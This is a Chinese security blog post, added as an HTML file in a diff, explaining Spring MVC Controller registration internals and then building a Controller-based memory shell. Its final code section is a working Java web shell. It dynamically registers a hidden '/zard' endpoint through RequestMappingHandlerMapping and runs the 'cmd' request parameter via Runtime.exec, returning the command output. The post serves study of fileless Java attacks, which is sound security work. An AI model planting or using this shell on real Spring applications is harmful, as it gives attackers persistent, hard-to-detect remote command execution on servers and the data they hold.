@@ -1,0 +1,446 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+     
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<title>Spring内存马合集 | ch1e的随笔</title>
+<meta name="author" content="ch1e">
+<meta name="copyright" content="ch1e">
+
+<link rel="shortcut icon" href="https://ch1e.cn/img/favicon.png"> 
+
+
+    <meta name="keywords" content="web安全,Java安全,内存马">
+
+
+
+     
+    <meta name="description" content="前言前面学了Tomcat的Servlet和Filter内存马， 然后学了几天的spring，审了一个程序，就继续顺便把内存马的东西弄完吧。前面说到Servlet和Filter内存马其实都是在配置文件中注册一个Servlet或者Filter，因为他们的生命周期是到服务器结束才结束。其实Spring的controller的内存马也是如此，也是注册一个Controller来实现。因此我们需要了解Spri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring内存马合集">
+<meta property="og:url" content="https://ch1e.cn/2022/04/09/Spring_memory_shell/">
+<meta property="og:site_name" content="ch1e的随笔">
+<meta property="og:description" content="前言前面学了Tomcat的Servlet和Filter内存马， 然后学了几天的spring，审了一个程序，就继续顺便把内存马的东西弄完吧。前面说到Servlet和Filter内存马其实都是在配置文件中注册一个Servlet或者Filter，因为他们的生命周期是到服务器结束才结束。其实Spring的controller的内存马也是如此，也是注册一个Controller来实现。因此我们需要了解Spri">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+<meta property="article:published_time" content="2022-04-09T10:21:48.127Z">
+<meta property="article:modified_time" content="2022-04-10T13:35:58.103Z">
+<meta property="article:author" content="ch1e">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+ 
+
+<meta http-equiv="Cache-Control" content="no-siteapp"/>
+<link href="//cdn.jsdelivr.net" rel="preconnect">
+<link href="https://ch1e.cn" rel="prefetch">
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css " rel="stylesheet">
+<link href="/css/main.css " rel="stylesheet">
+<script src="/js/utlis.js"></script>
+ 
+    
+ 
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+     
+    
+ 
+     
+
+<script>
+    var $config = {
+        tocStyle: "visible",
+        CDN:{
+            fancyboxJs: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js",
+            fancyboxCss: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"
+        },
+        
+        
+    }
+</script>
+    
+
+
+
+
+  
+
+
+    <div id="body-wrap">
+        <nav id="nav-wrap">
+  <div class="navbar">
+    <div class="bar">
+      <a href="/" class="title">ch1e的随笔</a>
+
+      
+      <ul class="menu">
+         
+        <li><a href="/">首页</a></li>
+          
+        <li>
+          <a class="menu-child-hover" href="javascript:void(0);">找文章</a>
+          <ul class="menu-child">
+            
+            <li><a href='/tags'>标签</a></li>
+            
+            <li><a href='/archives'>归档</a></li>
+            
+          </ul>
+        </li>
+          
+        <li><a href="/link">友情链接</a></li>
+         
+      </ul>
+      <i class="fas fa-bars open-nav"></i>
+    </div>
+  </div>
+  <div id="mobile-nav">
+    <ul>
+       
+      <li><a href="/">首页</a></li>
+         
+      <li><a href='/tags'>标签</a></li>
+      
+      <li><a href='/archives'>归档</a></li>
+         
+      <li><a href="/link">友情链接</a></li>
+       
+    </ul>
+  </div>
+</nav>
+
+
+        <main id="main">
+            
+
+<article id="post">
+  <div class="post-info">
+    <div class="post-title">
+      <h1>Spring内存马合集</h1>
+    </div>
+    <div class="post-meta">
+      <div class="post-date">
+        <i class="far fa-calendar-alt fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          发表于
+            2022-04-09 |
+        </span>
+        
+        <i class="fas fa-history fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          更新于
+            2022-04-10
+        </span>
+      </div>
+      <div class="post-meta-wordcount">
+        <i class="far fa-file-word fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">总字数:</span>
+        <span class="word-count">1.2k | </span>
+        <i class="far fa-clock fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">阅读时长:</span>
+        <span>6分钟</span>
+        
+      </div>
+    </div>
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面学了Tomcat的Servlet和Filter内存马， 然后学了几天的spring，审了一个程序，就继续顺便把内存马的东西弄完吧。前面说到Servlet和Filter内存马其实都是在配置文件中注册一个Servlet或者Filter，因为他们的生命周期是到服务器结束才结束。其实Spring的controller的内存马也是如此，也是注册一个Controller来实现。因此我们需要了解SpringMVC中Controller注册的流程。</p>
+<h1 id="Controller注册流程"><a href="#Controller注册流程" class="headerlink" title="Controller注册流程"></a>Controller注册流程</h1><p>SpringMVC初始化时，在bean的构造方法以及设置属性之后会使用InitializingBean#afterPropertiesSet进行Bean的初始化操作，实现类 RequestMappingHandlerMapping 用来处理具有 <code>@Controller</code> 注解类中的方法级别的 <code>@RequestMapping</code> 以及 RequestMappingInfo 实例的创建，AbstractHandlerMapping是RequestMappingHandlerMapping的父类，并且AbstractHandlerMapping实现了InitializingBean接口，所以先来看一下RequestMappingHandlerMapping#afterPropertiesSet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.config = <span class="keyword">new</span> RequestMappingInfo.BuilderConfiguration();</span><br><span class="line">   <span class="keyword">this</span>.config.setUrlPathHelper(getUrlPathHelper());</span><br><span class="line">   <span class="keyword">this</span>.config.setPathMatcher(getPathMatcher());</span><br><span class="line">   <span class="keyword">this</span>.config.setSuffixPatternMatch(<span class="keyword">this</span>.useSuffixPatternMatch);</span><br><span class="line">   <span class="keyword">this</span>.config.setTrailingSlashMatch(<span class="keyword">this</span>.useTrailingSlashMatch);</span><br><span class="line">   <span class="keyword">this</span>.config.setRegisteredSuffixPatternMatch(<span class="keyword">this</span>.useRegisteredSuffixPatternMatch);</span><br><span class="line">   <span class="keyword">this</span>.config.setContentNegotiationManager(getContentNegotiationManager());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">super</span>.afterPropertiesSet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先初始化了了一个config对象给自身的config属性，并且设置对应的值，然后调用的父类的afterPropertiesSet方法，也就是AbstractHandlerMapping#afterPropertiesSet</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220410200148683.png" alt="image-20220410200148683"></p>
+<p>AbstractHandlerMapping#afterPropertiesSet调用了initHandlerMethods方法，循环遍历Spring 中注册的 Bean并且使用processCandidateBean方法进行处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processCandidateBean</span><span class="params">(String beanName)</span> </span>&#123;</span><br><span class="line">   Class&lt;?&gt; beanType = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      beanType = obtainApplicationContext().getType(beanName);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      <span class="comment">// An unresolvable bean type, probably from a lazy bean - let&#x27;s ignore it.</span></span><br><span class="line">      <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">         logger.trace(<span class="string">&quot;Could not resolve type for bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (beanType != <span class="keyword">null</span> &amp;&amp; isHandler(beanType)) &#123;</span><br><span class="line">      detectHandlerMethods(beanName);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>processCandidateBean方法，判断了beanType不为空并且是Handler，就调用detectHandlerMethods方法，这里的isHandler就是判断beanType是否有RequestMapping和Controller的注解</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220410200959111.png" alt="image-20220410200959111"></p>
+<p>首先通过反射获取当前Controller Bean的对象，并且获取当前bean的所有Handler Method，根据method定义是否带有RequestMapping注解，如果有，根据注解创建RequestMappinginfo对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">detectHandlerMethods</span><span class="params">(Object handler)</span> </span>&#123;</span><br><span class="line">   Class&lt;?&gt; handlerType = (handler <span class="keyword">instanceof</span> String ?</span><br><span class="line">         obtainApplicationContext().getType((String) handler) : handler.getClass());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (handlerType != <span class="keyword">null</span>) &#123;</span><br><span class="line">      Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line">      Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType,</span><br><span class="line">            (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> getMappingForMethod(method, userType);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Invalid mapping on handler class [&quot;</span> +</span><br><span class="line">                        userType.getName() + <span class="string">&quot;]: &quot;</span> + method, ex);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">      <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">         logger.trace(formatMappings(userType, methods));</span><br><span class="line">      &#125;</span><br><span class="line">      methods.forEach((method, mapping) -&gt; &#123;</span><br><span class="line">         Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);</span><br><span class="line">         registerHandlerMethod(handler, invocableMethod, mapping);</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>return getMappingForMethod(method, userType);</code>创建了RequestMappinginfo对象，<code>methods.forEach((method, mapping)</code>处循环遍历method，并且通过registerHandlerMethod把handler method与对应的RequestMappingInfo 创建映射</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">registerHandlerMethod</span><span class="params">(Object handler, Method method, T mapping)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>registerHandlerMethod调用mappingRegistry.register方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(T mapping, Object handler, Method method)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.readWriteLock.writeLock().lock();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      HandlerMethod handlerMethod = createHandlerMethod(handler, method);</span><br><span class="line">      assertUniqueMethodMapping(handlerMethod, mapping);</span><br><span class="line">      <span class="keyword">this</span>.mappingLookup.put(mapping, handlerMethod);</span><br><span class="line"></span><br><span class="line">      List&lt;String&gt; directUrls = getDirectUrls(mapping);</span><br><span class="line">      <span class="keyword">for</span> (String url : directUrls) &#123;</span><br><span class="line">         <span class="keyword">this</span>.urlLookup.add(url, mapping);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String name = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (getNamingStrategy() != <span class="keyword">null</span>) &#123;</span><br><span class="line">         name = getNamingStrategy().getName(handlerMethod, mapping);</span><br><span class="line">         addMappingName(name, handlerMethod);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      CorsConfiguration corsConfig = initCorsConfiguration(handler, method, mapping);</span><br><span class="line">      <span class="keyword">if</span> (corsConfig != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">this</span>.corsLookup.put(handlerMethod, corsConfig);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.registry.put(mapping, <span class="keyword">new</span> MappingRegistration&lt;&gt;(mapping, handlerMethod, directUrls, name));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.readWriteLock.writeLock().unlock();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把关键信息存储到自身的mappingLookup，urlLookup，corsLookup，registry属性下</p>
+<h1 id="Controller内存马编写"><a href="#Controller内存马编写" class="headerlink" title="Controller内存马编写"></a>Controller内存马编写</h1><p>编写内存马的步骤如下</p>
+<ul>
+<li>利用spring内部方法获取context</li>
+<li>获得 RequestMappingHandlerMapping 的实例</li>
+<li>通过反射获得自定义Controller的恶意方法的Method对象</li>
+<li>定义对应的URL地址</li>
+<li>定义访问的方法</li>
+<li>动态注册Controller</li>
+</ul>
+<p>结果如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ch1e.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.util.xml.impl.Input;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.ContextLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ch1e</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/ch1e&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ch1e</span><span class="params">()</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获取WebApplicationContext</span></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//获取RequestMappingHandlerMapping</span></span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">//获取恶意类的恶意方法</span></span><br><span class="line">        Method injectMethod =zard.class.getMethod(<span class="string">&quot;inject&quot;</span>);</span><br><span class="line">        <span class="comment">//定义访问恶意Controller的url</span></span><br><span class="line">        PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">&quot;/zard&quot;</span>);</span><br><span class="line">        <span class="comment">//定义允许访问恶意controller的HTTP请求方法（GET/POST）</span></span><br><span class="line">        RequestMethodsRequestCondition ms=<span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line">        <span class="comment">//动态注册Controller</span></span><br><span class="line">        RequestMappingInfo info = <span class="keyword">new</span> RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        zard zardController = <span class="keyword">new</span> zard();</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, zardController, injectMethod);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//恶意类</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zard</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">zard</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">            <span class="comment">//获取request</span></span><br><span class="line">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            InputStream inputStream=Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">            InputStreamReader inputStreamReader=<span class="keyword">new</span> InputStreamReader(inputStream, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">            String str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            String line = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                str=str+line;</span><br><span class="line">            &#125;</span><br><span class="line">            inputStream.close();</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次Controller内存马的文章前面的分析过程参考了<a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">su18师傅</a>，总体来说还是有一些地方暂时没有理解，后续可能会继续往这里进行补充，会二刷内存马</p>
+
+  </div>
+   
+   
+
+  
+  <div class="post-copyright">
+    <div class="post-copyright-icon"></div>
+      <div class="post-copyright-author">
+          <span class="post-copyright-meta">文章作者: </span>
+            <span class="post-copyright-info">
+              <a href="mailto:1444440144@qq.com" >ch1e</a>
+            </span>
+      </div>
+      <div class="post-copyright-type">
+          <span class="post-copyright-meta">文章链接: </span>
+            <span class="post-copyright-info">
+              <a href="https://ch1e.cn/2022/04/09/Spring_memory_shell/" >https://ch1e.cn/2022/04/09/Spring_memory_shell/</a>
+            </span>
+      </div><div class="post-copyright-notice">
+          <span class="post-copyright-meta">版权声明: </span>
+            <span class="post-copyright-info">本博客所有文章除特别声明外，均采用
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/ " target="_blank" >
+                  CC BY-NC-SA 4.0 </a> 许可协议。转载请注明来自
+              <a href="https://ch1e.cn/2022/04/09/Spring_memory_shell/" target="_blank" >ch1e</a>
+              ！</span>
+      </div>
+  </div>
+  
+
+
+ 
+
+  
+    <div class="post-tag">
+        <span>
+            <i class="fa fa-tag"></i>
+             
+            <a href="tags/web安全/"><span>web安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/Java安全/"><span>Java安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/内存马/"><span>内存马</span></a>
+                
+            
+        </span>
+    </div>
+  
+
+
+
+
+<div class="pagination-post">
+    
+    
+    <a href="/2022/04/06/ls1/">
+      <div class="next-title">Java代码审计练习(一)<i class="fas fa-chevron-right"></i></div>
+      <div class="next-desc">前言摸了好几天的鱼，被早8折磨的死去活来，一但早8，整天没精神，今天还被体育课折磨到低血糖，想到自己这么菜，选择继续学习，晚上稍微看了一下SSM框架，感觉非常无聊，突然心血来潮想审几个程序练练手...</div>
+    </a>
+    
+</div>
+
+</article>
+ 
+
+
+  <div id="toc-wrap">
+    <div id="toc">
+      <div class="toc-title">
+        <div>
+          目录
+            <span class="num">0%</span>
+        </div>
+        <progress class="progress" value="0" max="100"></progress>
+      </div>
+      <div class="toc-list">
+         
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Controller%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="toc-text">Controller注册流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Controller%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-text">Controller内存马编写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+      </div>
+    </div>
+  </div>
+
+
+        </main>
+        <section id="rightside">
+    
+    <div class="rightside-item">
+        
+        
+         
+        
+        
+            <a id="open-toc" title="目录">
+                <i class="fas fa-list-ul"></i>
+            </a>
+        
+         
+         
+        <a href="javascript:(0)" id="darkmode" title="深色/浅色 ">
+            <i class="fas fa-moon"></i>
+        </a>
+         
+        
+        <a href="#" title="回到顶部">
+            <i class="fas fa-arrow-up"></i>
+        </a>
+    </div>
+</section>
+         
+
+<footer class="footer" id="footer">
+    <div class="copyright">
+      &copy; 2020 - 2022
+        <i class="fas fa-fan"></i>
+        ch1e
+    </div>
+    <div class="framework-info">
+        <span>框架 </span>
+        <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="footer-separator">|</span>
+        <span>主题 </span>
+        <a href="https://github.com/lete114/hexo-theme-MengD" target="_blank">MengD.(萌典) </a>
+    </div>
+    
+    <div class="custom-text">我相信我可以，但我一直在路上，所以我有无限的可能！！</div>
+</footer>
+    </div>
+    <div id="mask" onclick="closeAll()"></div>
+    
+    <div class="script">
+        <script src="/js/main.js"></script>
+        
+
+ 
+<script>
+    var originTitle = document.title;
+    var titleTime;
+    document.addEventListener("visibilitychange", function () {
+        if (document.hidden) {
+            document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+            clearTimeout(titleTime);
+        } else {
+            document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+            titleTime = setTimeout(function () {
+                document.title = originTitle;
+            }, 2000);
+        }
+    });
+</script>
+
+
+<script src="/js/lazyload.js"></script>
+
+
+    
+
+
+        
+    <script>
+        getScript('https://cdn.jsdelivr.net/npm/pjax/pjax.min.js',LoadPjax)
+        function LoadPjax() {
+            var pjax = new Pjax({
+                selectors: [
+                    'head title',
+                    'head meta[name="keywords"]',
+                    'head meta[name="description"]',
+                    'main',
+                    '#rightside'
+                ],
+                cache: true,
+                cacheBust: false
+            });
+        }
+
+        // 清除时间
+        var timer = null;
+        // 执行进度条
+        function ProgressStart() {
+            // 设置初始进度
+            var progress = 10;
+            // 创建进度条 及 css样式
+            var div = document.createElement('div');
+            div.className = 'pjax-progress';
+            document.body.prepend(div);
+            // 定义随机数最大值最小值
+            var max = 10, mini = 3;
+            var result = max - mini;
+            // 清除
+            clearInterval(timer);
+            // 0.5秒内累加进度
+            timer = setInterval(function () {
+                // 随机数
+                var num = parseInt(Math.random() * result);
+                var randomResult = num + mini;
+                // 累加
+                progress += randomResult
+                document.getElementsByClassName('pjax-progress')[0].style.width = progress + '%';
+                // 当进度达到95%时停止
+                if (progress > 95) progress = 95
+            }, 500)
+        }
+        // 加载进度条加载完毕
+        function ProgressFinish() {
+            clearInterval(timer);
+            // 页面加载完毕后进度100% 并在0.7秒后删除
+            var progress = document.getElementsByClassName('pjax-progress');
+            progress[0].style.width = '100%';
+            timer = setTimeout(function () {
+                progress[0].parentNode.removeChild(progress[0])
+            }, 700);
+        }
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+            // 执行进度条
+            ProgressStart()
+        });
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+
+            // 加载进度条加载完毕
+            ProgressFinish()
+            // 执行所有方法
+            exeAllFn()
+
+            
+                // 图片懒加载
+                ImgLazyLoad('body img[data-img]', 'data-img')
+            
+
+
+            document.querySelectorAll('script[data-pjax]').forEach(item => {
+                const newScript = document.createElement('script')
+                const content = item.text || item.textContent || item.innerHTML || ''
+                Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+                newScript.appendChild(document.createTextNode(content))
+                item.parentNode.replaceChild(newScript, item)
+            })
+        });
+
+        // Pjax请求错误时，跳转到404页面
+        document.addEventListener('pjax:error', (err) => {
+            if (err.request.status === 404) {
+                pjax.loadUrl('/404.html')
+            }
+        })
+    </script>
+
+    </div>
+</body>
+
+</html>
